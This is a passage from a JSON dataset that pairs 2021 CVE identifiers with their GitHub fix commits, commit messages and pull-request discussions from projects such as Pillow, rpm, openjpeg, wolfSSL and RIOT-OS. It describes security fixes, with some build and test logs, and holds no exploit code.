            "commit_msg": "Fix FLI DOS -- CVE-2021-28676\n\n* FliDecode did not properly check that the block advance was\n  non-zero, potentally leading to an infinite loop on load.\n* This dates to the PIL Fork\n* Found with oss-fuzz",
            "commit_msg_words": 36,
            "other_info": "Security fixes for 8.2.0 @wiredfool There are 3 fails (in addition to xfails) on the valgrind workflow, is this good to merge or do we want to check those first?  I know these patches are good, and I'm not too worried because they're 3 separate images in the fuzz_images test, which is mainly ensuring that the fuzzer runs under test (but not as fuzzing).  Thanks, proceeding with the release!  Hi, the CVEs mentioned in commits and release notes will be reported to Mitre?\r\nThanks. They have been, yes. Go to https://pillow.readthedocs.io/en/stable/releasenotes/8.2.0.html#security to see links to the reports. Why are there 2 CVEs assigned for \"Fix OOB read in Jpeg2KDecode?\" Could someone please explain? @hugovk @radarhere @wiredfool  One each for:\r\n\r\n* CVE-2021-25287: \"There is an out-of-bounds read in J2kDecode, in j2ku_graya_la.\"\r\n\r\n* CVE-2021-25288: \"There is an out-of-bounds read in J2kDecode, in j2ku_gray_i.\"\r\n\r\n---\r\n\r\nThe CVEs from https://pillow.readthedocs.io/en/stable/releasenotes/8.2.0.html#security at MITRE ([example](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25288)) are still showing as reserved:\r\n\r\n> **\u00a0RESERVED\u00a0** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.\r\n\r\nDo we or Tidelift need to do anything to publicise them? https://cve.mitre.org/cve/researcher_reservation_guidelines#researcher_reservation_guidelines#12\r\n> 12. Notify the CVE Team that the vulnerability has been made public using the CVE Request web form, and selecting \"Notify CVE about a Publication.\"\r\n\r\nI've submitted https://cveform.mitre.org/ accordingly. There were 2 cves assigned for 2 fuzzier test cases that looked very similar before I got to fixing it.  Once the fix was done, there was one bug that could hit any multiband mode but the fuzzier only found these two.   I received an e-mail response, and the CVEs should now be public.",
            "pr_title_words": 4,
            "comments_words": 284,
            "total_other_info_words": 288
        },
        {
            "cve-id": "CVE-2021-45789",
            "commit_url": "https://github.com/metersphere/metersphere/commit/d74e02cdff47cdf7524d305d098db6ffb7f61b47",
            "commit_msg": "fix: csv\u4e0b\u8f7d\u63a5\u53e3\u53ef\u4ee5\u8bbf\u95ee\u5230\u7cfb\u7edf\u76ee\u5f55\nclose #8652",
            "commit_msg_words": 4,
            "other_info": "fix: csv\u4e0b\u8f7d\u63a5\u53e3\u53ef\u4ee5\u8bbf\u95ee\u5230\u7cfb\u7edf\u76ee\u5f55",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-4284",
            "commit_url": "https://github.com/openmrs/openmrs-module-htmlformentryui/commit/811990972ea07649ae33c4b56c61c3b520895f07",
            "commit_msg": "Ra 1424:  escapeJs is vulnerable to XSS attacks  (#51)\n\n* RA-1424: escapeJs vulnerable to XSS\r\n\r\n* RA-1424: escapeJs vulnerable to XSS",
            "commit_msg_words": 21,
            "other_info": "Ra 1424:  escapeJs is vulnerable to XSS attacks",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-32700",
            "commit_url": "https://github.com/ballerina-platform/ballerina-lang/commit/4609ffee1744ecd16aac09303b1783bf0a525816",
            "commit_msg": "Fix central connection",
            "commit_msg_words": 3,
            "other_info": "Fix central connection # [Codecov](https://codecov.io/gh/ballerina-platform/ballerina-lang/pull/29246?src=pr&el=h1) Report\n> Merging [#29246](https://codecov.io/gh/ballerina-platform/ballerina-lang/pull/29246?src=pr&el=desc) (4609ffe) into [ballerina-1.2.x](https://codecov.io/gh/ballerina-platform/ballerina-lang/commit/9e6464b9f28a0f707fb1e8ded125be46c1849e41?el=desc) (9e6464b) will **not change** coverage.\n> The diff coverage is `n/a`.\n\n[![Impacted file tree graph](https://codecov.io/gh/ballerina-platform/ballerina-lang/pull/29246/graphs/tree.svg?width=650&height=150&src=pr&token=IgZRPljg71)](https://codecov.io/gh/ballerina-platform/ballerina-lang/pull/29246?src=pr&el=tree)\n\n```diff\n@@               Coverage Diff                @@\n##           ballerina-1.2.x   #29246   +/-   ##\n================================================\n  Coverage            14.59%   14.59%           \n================================================\n  Files                   51       51           \n  Lines                 1411     1411           \n  Branches               219      219           \n================================================\n  Hits                   206      206           \n  Misses                1189     1189           \n  Partials                16       16           \n```\n\n\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/ballerina-platform/ballerina-lang/pull/29246?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/ballerina-platform/ballerina-lang/pull/29246?src=pr&el=footer). Last update [a3bac05...4609ffe](https://codecov.io/gh/ballerina-platform/ballerina-lang/pull/29246?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 3,
            "comments_words": 100,
            "total_other_info_words": 103
        },
        {
            "cve-id": "CVE-2021-35939",
            "commit_url": "https://github.com/rpm-software-management/rpm/commit/96ec957e281220f8e137a2d5eb23b83a6377d556",
            "commit_msg": "Validate intermediate symlinks during installation, CVE-2021-35939\n\nWhenever directory changes during unpacking, walk the entire tree from\nstarting from / and validate any symlinks crossed, fail the install\non invalid links.\n\nThis is the first of step of many towards securing our file operations\nagainst local tamperers and besides plugging that one CVE, paves the way\nfor the next step by adding the necessary directory fd tracking.\nThis also bumps the rpm OS requirements to a whole new level by requiring\nthe *at() family of calls from POSIX-1.2008.\n\nThis necessarily does a whole lot of huffing and puffing we previously\ndid not do. It should be possible to cache secure (ie root-owned)\ndirectory structures to avoid validating everything a million times\nbut for now, just keeping things simple.",
            "commit_msg_words": 127,
            "other_info": "First steps towards fixing the symlink CVEs It should be noted (probably in the commit message too) that as these symlink CVE's overlap and interact in various ways, this does not fully fix CVE-2021-35939 as the directory tracking does not cover all our installation steps yet. Plugging all the holes requires converting *all* of FSM to the *at() family of calls plus fd-based ops where possible, so this really is just the first step of many to come. I'm quite aware of Linux having all manner of fancy extensions available.\r\nRpm is portable software and we need to fix this stuff using what's available in POSIX, utilizing non-portable extensions would only make things far more complicated rather than help. There's enough complexities to deal with as it is, thank you very much. This is now using fd or dirfd+basename for file ops within the fsm, as much as possible. Plugins pose special problems as external libraries generally dont support dirfd+basename style operation, but may still need to operate on symlinks so we're stuck with \"insecure\" absolute paths there, for now at least.\r\n\r\nI'm seeing a couple of install glitches on fresh chroot install still, but it's getting close now.\r\nOf course a change this big and drastic *will* have bugs in it initially, I have no illusions about that.\r\n\r\n(edit: hmph, the test-suite was passing just a minute ago...) Okay, test-suite + all my local tests (install to empty chroot etc) pass now :partying_face:  > This is now using fd or dirfd+basename for file ops within the fsm, as much as possible. Plugins pose special problems as external libraries generally dont support dirfd+basename style operation, but may still need to operate on symlinks so we're stuck with \"insecure\" absolute paths there, for now at least.\r\n\r\nCute (but non-portable) trick: use paths of the form `/dev/fd/$FDNUM/something`.  Works at least on Linux. Yeah once we have the basics working and optimized to a reasonable degree we can start looking at utilizing various OS-specific extensions. The gotcha with those is to find ways to provide extra functionality in the specific OS'es *without* introducing multiple codepaths (which will inevitably bitrot) to accomplish the same thing. Anyway...\r\n\r\nThere will inevitably be bugs in this all, and since the test-suite covers only so much the best way to find the rest is real-world testing. And sitting in a branch does little to achieve that, so I'm merging this as is now.\r\n\r\nDanger Will Robinson, if you're in the habbit of running rpm daily snapshots then you'll want to stay alert for a while. Oh, and to make it absolutely clear: we're nowhere *near* done with this, I just want to get this bulk of change over with so we can concentrate with the finer nuances. @pmatilai  Thanks for fixing these CVEs.  And I want to double check with you that \r\ndoes these 32 commits in this pull request fully fix CVE-2021-35937, CVE-2021-35938, CVE-2021-35939? \r\nAny plan to porting it to 4.17.x branch? There will be no backports.",
            "pr_title_words": 7,
            "comments_words": 493,
            "total_other_info_words": 500
        },
        {
            "cve-id": "CVE-2021-25929",
            "commit_url": "https://github.com/OpenNMS/opennms/commit/eb08b5ed4c5548f3e941a1f0d0363ae4439fa98c",
            "commit_msg": "NMS-13231: Backport Security Issues from Last Month",
            "commit_msg_words": 7,
            "other_info": "NMS-13231: Backport Security Issues from Last Month",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2021-29481",
            "commit_url": "https://github.com/ratpack/ratpack/commit/d7d240c06536a8b89a917e4ac842c337f7ea31f0",
            "commit_msg": "Encrypt client side session cookies by default",
            "commit_msg_words": 7,
            "other_info": "Use random UUID for default client side session encryption secret",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2021-42646",
            "commit_url": "https://github.com/wso2/carbon-identity-framework/commit/e9119883ee02a884f3c76c7bbc4022a4f4c58fc0",
            "commit_msg": "Create secure parser for unmarshalling SP file content",
            "commit_msg_words": 8,
            "other_info": "Create Secure Parser for Unmarshalling SP File Content PR builder started \nLink: https://github.com/wso2/product-is/actions/runs/739956280 PR builder completed \nLink: https://github.com/wso2/product-is/actions/runs/739956280 \nStatus: **failure** PR builder started \nLink: https://github.com/wso2/product-is/actions/runs/751178888 PR builder completed \nLink: https://github.com/wso2/product-is/actions/runs/751178888 \nStatus: **failure**",
            "pr_title_words": 8,
            "comments_words": 24,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2021-20224",
            "commit_url": "https://github.com/ImageMagick/ImageMagick/commit/5af1dffa4b6ab984b5f13d1e91c95760d75f12a6",
            "commit_msg": "outside the range of representable values of type 'unsigned char' (#3083)\n\nCo-authored-by: Zhang Xiaohui <ruc_zhangxiaohui@163.com>",
            "commit_msg_words": 15,
            "other_info": "outside the range of representable values of type 'unsigned char'",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2021-3336",
            "commit_url": "https://github.com/wolfSSL/wolfssl/commit/fad1e67677bf7797b6bd6e1f21a513c289d963a7",
            "commit_msg": "TLS 1.3: ensure key for signature in CertificateVerify",
            "commit_msg_words": 8,
            "other_info": "TLS 1.3: ensure key for signature in CertificateVerify Hi, Debian is gradually freezing modifications in preparation for a major release, while the CVE addressed here received a relatively high NVD assessment. I leave this comment merely to receive automatic updates, especially when the fix is merged.\r\n\r\nDebian has a flexible process for security updates, in which `wolfSSL` is guaranteed the most favorable treatment, but it would be easier to cherry-pick the fix in the next month or so.\r\n\r\nPlease write if I am too cautious or if this commit is unsuitable for application against the stable 4.6.0 release. Thank you for providing your great products under open-source licenses! @dgarske Thanks for expediting. The fix was cherry-picked for Debian in `4.6.0-3` and is now available in `unstable` (in time for the upcoming `bullseye`) and in `stable-backports`.\r\n\r\nUsually, my packages are picked up subsequently by several other Debian-based distributions with rolling releases.\r\n\r\nAlas, the Repology tracker does not show downstream revisions, i.e. the `-3`. For a better overview there, we would require a maintenance release `4.6.1`, but I am not sure that is needed.",
            "pr_title_words": 8,
            "comments_words": 174,
            "total_other_info_words": 182
        },
        {
            "cve-id": "CVE-2021-32292",
            "commit_url": "https://github.com/json-c/json-c/commit/4e9e44e5258dee7654f74948b0dd5da39c28beec",
            "commit_msg": "Fix read past end of buffer\n\nResolves https://github.com/json-c/json-c/issues/654",
            "commit_msg_words": 8,
            "other_info": "json_parse: Fix read past end of buffer \n[![Coverage Status](https://coveralls.io/builds/32603465/badge)](https://coveralls.io/builds/32603465)\n\nCoverage remained the same at 86.923% when pulling **4e9e44e5258dee7654f74948b0dd5da39c28beec on MarcT512:issue654** into **56a89f902f360c91a80ac0c7419d2ba1aa8e8634 on json-c:master**.",
            "pr_title_words": 7,
            "comments_words": 17,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2021-36143",
            "commit_url": "https://github.com/projectacrn/acrn-hypervisor/commit/154fe59531c12b82e26d1b24b5531f5066d224f5",
            "commit_msg": "dm: validate inputs in vq_endchains\n\n inputs shall be validated to avoid NULL pointer access.\n\nTracked-On: #6129\nSigned-off-by: Yonghua Huang <yonghua.huang@intel.com>",
            "commit_msg_words": 20,
            "other_info": "dm: validate inputs in vq_endchains No new violations to the coding guideline detected.<br>No New Name Conflict<br>No New Function Declaration/Definition Mismatch OK to verify try verify EHL try verify EHL OK to verify",
            "pr_title_words": 5,
            "comments_words": 27,
            "total_other_info_words": 32
        },
        {
            "cve-id": "CVE-2021-31684",
            "commit_url": "https://github.com/netplex/json-smart-v1/commit/c558138b3cb11f586643f95fbca4ce5c4e92a198",
            "commit_msg": "Fix out of bound exception",
            "commit_msg_words": 5,
            "other_info": "Fix out of bound exception",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2021-3575",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/7bd884f8750892de4f50bf4642fcfbe7011c6bdf",
            "commit_msg": "opj_decompress: fix off-by-one read heap-buffer-overflow in sycc420_to_rgb() when x0 and y0 are odd (CVE-2021-3575, fixes #1347)",
            "commit_msg_words": 16,
            "other_info": "opj_decompress: fix off-by-one read heap-buffer-overflow in sycc420_to_rgb() when x0 and y0 are odd (CVE-2021-3575, fixes #1347) Is there a plan to release v2.5.1 with the fix anytime soon? > Is there a plan to release v2.5.1 with the fix anytime soon?\r\n\r\nyes, as indicated on the mailing list : https://groups.google.com/g/openjpeg/c/Mrz0Zeo79WY\r\n\"I'll hope to tackle soon a 2.5.1 release. Use that as a signal to test\r\nmaster and report any regression, or if there are changes that need to\r\ngo in it, be sure to provide pull requests soon \"",
            "pr_title_words": 16,
            "comments_words": 73,
            "total_other_info_words": 89
        },
        {
            "cve-id": "CVE-2021-32631",
            "commit_url": "https://github.com/nimble-platform/common/commit/a59ad46733912a5580530e39cac0e6ebc83cc563",
            "commit_msg": "Use parseClaimsJws method instead of parseJws",
            "commit_msg_words": 6,
            "other_info": "Jwt fix",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-27697",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/72337ebb9b9832e0fb513590191b9ad99623f0d3",
            "commit_msg": "gnrc_rpl: harden validation routine for options",
            "commit_msg_words": 6,
            "other_info": "gnrc_rpl: harden validation routine for options",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-32276",
            "commit_url": "https://github.com/knik0/faad2/commit/b58840121d1827b4b6c7617e2431589af1776ddc",
            "commit_msg": "Check for error after each channel decode.\n\nhInfo->error is reset within the decode_* functions. This caused the decoder\nto ignore errors for some channels in the error resilience (ER) code path.\n\nFixes #58.",
            "commit_msg_words": 33,
            "other_info": "Fix additional crashes. Thank you very much for this!",
            "pr_title_words": 3,
            "comments_words": 6,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2021-34071",
            "commit_url": "https://github.com/justdan96/tsMuxer/commit/ea879f3b915baa4f9d145ce44229f7b3b1952c30",
            "commit_msg": "[bug] heap buffer overflow when last byte of SEI = 0xFF (#425)\n\nFixes #423\r\nFixes #427\r\nFixes #430\r\nFixes #433",
            "commit_msg_words": 20,
            "other_info": "[bug] heap buffer overflow when last byte of SEI = 0xFF",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2021-42779",
            "commit_url": "https://github.com/OpenSC/OpenSC/commit/1db88374bb7706a115d5c3617c6f16115c33bf27",
            "commit_msg": "oberthur: Correctly check for return values\n\nThanks oss-fuzz\n\nhttps://bugs.chromium.org/p/oss-fuzz/issues/detail?id=28843",
            "commit_msg_words": 9,
            "other_info": "Another batch of fixes for fuzzing issues as reported by oss-fuzz",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2021-21428",
            "commit_url": "https://github.com/OpenAPITools/openapi-generator/commit/be64b6f1b3d4d7b6cfdce12c0f3953be6a1ff195",
            "commit_msg": "use Files.createTempFile to address security concerns",
            "commit_msg_words": 6,
            "other_info": "[online] use Files.createTempFile to address security concerns \ud83d\udc4d Thanks for opening this issue!\n\ud83c\udff7 I have applied any labels matching special text in your issue.\n\nThe team will review the labels and make any necessary changes.",
            "pr_title_words": 7,
            "comments_words": 29,
            "total_other_info_words": 36
        },
        {
            "cve-id": "CVE-2021-43820",
            "commit_url": "https://github.com/haiwen/seafile-server/commit/c7c38c129fb8cee5ee14f44982283f4527133dcf",
            "commit_msg": "Validate repo_id when validate token from cache",
            "commit_msg_words": 7,
            "other_info": "Validate repo_id when validate token from cache",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2021-29338",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/f0727df07c4d944d7d1c5002451cfbc9545d3288",
            "commit_msg": "Fix integer overflow in num_images\n\nIncludes the fix for CVE-2021-29338\nCredit to @kaniini based on #1346\nFixes #1338",
            "commit_msg_words": 18,
            "other_info": "Fix integer overflow in num_images It's not clear to me if the `OPJ_PATH_LEN * 2` changes from #1346 are also necessary since f0629cb was merged into master. Can you help confirm @rouault ? > It's not clear to me if the `OPJ_PATH_LEN * 2` changes from #1346 are also necessary since [f0629cb](https://github.com/uclouvain/openjpeg/commit/f0629cb1c4c485d905936413556deb2872ac51e5) was merged into master. Can you help confirm @rouault ?\r\n\r\nI don't think they are necessary since we have other checks that should prevent buffer overflow Thanks for taking care of this @baparham!",
            "pr_title_words": 5,
            "comments_words": 80,
            "total_other_info_words": 85
        },
        {
            "cve-id": "CVE-2021-27357",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/896e44cf931132801c1c6b18a3194ac44504dd24",
            "commit_msg": "rpl: strenghen length checks for DAO and DAO-ACK",
            "commit_msg_words": 8,
            "other_info": "rpl: strengthen length checks for DAO and DAO-ACK > 2\\. Also, check if a basic RPL topology forms (native is fine) and try to ping the root node.\r\n\r\nWorks\r\n\r\n![image](https://user-images.githubusercontent.com/675644/108393055-91250680-7213-11eb-86c2-aa0d078b5c77.png)\r\n <details><summary>This PR &#x2713;</summary>\r\n\r\n```console\r\n$ git apply <<< \"diff --git a/examples/gnrc_networking/Makefile b/examples/gnrc_networking/Makefile\r\nindex bf76931305..15132894c1 100644\r\n--- a/examples/gnrc_networking/Makefile\r\n+++ b/examples/gnrc_networking/Makefile\r\n@@ -31,6 +31,9 @@ USEMODULE += netstats_l2\r\n USEMODULE += netstats_ipv6\r\n USEMODULE += netstats_rpl\r\n \r\n+USEMODULE += gnrc_pktbuf_malloc\r\n+CFLAGS += -DCONFIG_GNRC_RPL_DEFAULT_NETIF=6\r\n+\r\n # Optionally include DNS support. This includes resolution of names at an\r\n # upstream DNS server and the handling of RDNSS options in Router Advertisements\r\n # to auto-configure that upstream DNS server.\"\r\n$ git diff\r\ndiff --git a/examples/gnrc_networking/Makefile b/examples/gnrc_networking/Makefile\r\nindex bf76931305..15132894c1 100644\r\n--- a/examples/gnrc_networking/Makefile\r\n+++ b/examples/gnrc_networking/Makefile\r\n@@ -31,6 +31,9 @@ USEMODULE += netstats_l2\r\n USEMODULE += netstats_ipv6\r\n USEMODULE += netstats_rpl\r\n \r\n+USEMODULE += gnrc_pktbuf_malloc\r\n+CFLAGS += -DCONFIG_GNRC_RPL_DEFAULT_NETIF=6\r\n+\r\n # Optionally include DNS support. This includes resolution of names at an\r\n # upstream DNS server and the handling of RDNSS options in Router Advertisements\r\n # to auto-configure that upstream DNS server.\r\n$ make -C examples/gnrc_networking all-asan\r\nmake: Entering directory '/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking'\r\nBuilding application \"gnrc_networking\" for \"native\" with MCU \"native\".\r\n\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/boards/native\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/boards/native/drivers\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/core\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/cpu/native\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/cpu/native/netdev_tap\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/cpu/native/periph\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/cpu/native/stdio_native\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/drivers\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/drivers/netdev\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/drivers/periph_common\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/auto_init\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/div\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/evtimer\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/fmt\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/iolist\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/luid\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/crosslayer/inet_csum\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netapi\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netif\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netif/ethernet\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netif/hdr\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netif/init_devs\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/netreg\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/icmpv6\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/icmpv6/echo\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/icmpv6/error\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/ipv6\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/ipv6/hdr\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/ipv6/nib\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/network_layer/ndp\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/pkt\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/pktbuf\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/pktbuf_malloc\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/pktdump\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/routing/rpl\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc/transport_layer/udp\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/link_layer/eui_provider\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/link_layer/l2util\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/netif\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/network_layer/icmpv6\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/network_layer/ipv6/addr\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/network_layer/ipv6/hdr\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/transport_layer/udp\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/od\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/ps\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/random\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/random/tinymt32\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/shell\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/shell/commands\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/trickle\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/xtimer\r\n/usr/bin/ld: /home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking/bin/native/cpu/tramp.o: warning: relocation against `_native_isr_ctx' in read-only section `.text'\r\n/usr/bin/ld: warning: creating DT_TEXTREL in a PIE\r\n   text\t   data\t    bss\t    dec\t    hex\tfilename\r\n 602574\t  33344\t 105700\t 741618\t  b50f2\t/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking/bin/native/gnrc_networking.elf\r\nmake: Leaving directory '/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking'\r\n$ make -C examples/gnrc_networking term\r\nmake: Entering directory '/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking'\r\n/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking/bin/native/gnrc_networking.elf tap0 \r\nRIOT native interrupts/signals initialized.\r\nLED_RED_OFF\r\nLED_GREEN_ON\r\nRIOT native board initialized.\r\nRIOT native hardware initialization complete.\r\n\r\n==35948==WARNING: ASan doesn't fully support makecontext/swapcontext functions and may produce false positives in some cases!\r\nmain(): This is RIOT! (Version: 2021.04-devel-648-g896e4-HEAD)\r\nRIOT network stack example application\r\nAll up, running the shell now\r\n> ==35948==WARNING: ASan is ignoring requested __asan_handle_no_return: stack top: 0xffe0f000; bottom 0x56653000; size: 0xa97bc000 (-1451507712)\r\nFalse positive error reports may follow\r\nFor details see https://github.com/google/sanitizers/issues/189\r\nifconfig\r\nifconfig\r\nIface  6  HWaddr: E2:BC:7D:CB:F5:50 \r\n          L2-PDU:1500  MTU:1500  HL:64  RTR  \r\n          RTR_ADV  \r\n          Source address length: 6\r\n          Link type: wired\r\n          inet6 addr: fe80::e0bc:7dff:fecb:f550  scope: link  VAL\r\n          inet6 group: ff02::2\r\n          inet6 group: ff02::1\r\n          inet6 group: ff02::1:ffcb:f550\r\n          inet6 group: ff02::1a\r\n          \r\n          Statistics for Layer 2\r\n            RX packets 6  bytes 572\r\n            TX packets 2 (Multicast: 2)  bytes 156\r\n            TX succeeded 2 errors 0\r\n          Statistics for IPv6\r\n            RX packets 6  bytes 488\r\n            TX packets 2 (Multicast: 2)  bytes 128\r\n            TX succeeded 2 errors 0\r\n\r\n> \r\n```\r\n\r\n</details>\r\n<details><summary>Current master (<a href=\"https://github.com/RIOT-OS/RIOT/commit/f47b9c32cf524810ea5a6cc52f58b5395fb623b1\"><tt>f47b9c3</tt></a>) &#10007;</summary>\r\n\r\n```console\r\n$ git show\r\ncommit f47b9c32cf524810ea5a6cc52f58b5395fb623b1 (HEAD -> master, upstream/master, upstream/HEAD)\r\nMerge: d6c5bf4295 9a8c26bd34\r\nAuthor: Dylan Laduranty <dylan.laduranty@mesotic.com>\r\nDate:   Thu Feb 18 16:28:38 2021 +0100\r\n\r\n    Merge pull request #16045 from fjmolinas/pr_bootloader_dfu_makefile\r\n    \r\n    bootloader/dfu: fix USEMODULE=\r\n\r\n$ make -C examples/gnrc_networking all-asan\r\nmake: Entering directory '/home/mlenders/Repositories/RIOT-OS/RIOT/examples/gnrc_networking'\r\nBuilding application \"gnrc_networking\" for \"native\" with MCU \"native\".\r\n\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/boards/native\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/boards/native/drivers\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/core\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/cpu/native\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/cpu/native/netdev_tap\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/cpu/native/periph\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/cpu/native/stdio_native\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/drivers\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/drivers/netdev\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/drivers/periph_common\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/auto_init\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/div\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/evtimer\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/fmt\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/iolist\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/luid\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/crosslayer/inet_csum\r\n\"make\" -C /home/mlenders/Repositories/RIOT-OS/RIOT/sys/net/gnrc\r\n\"make\" 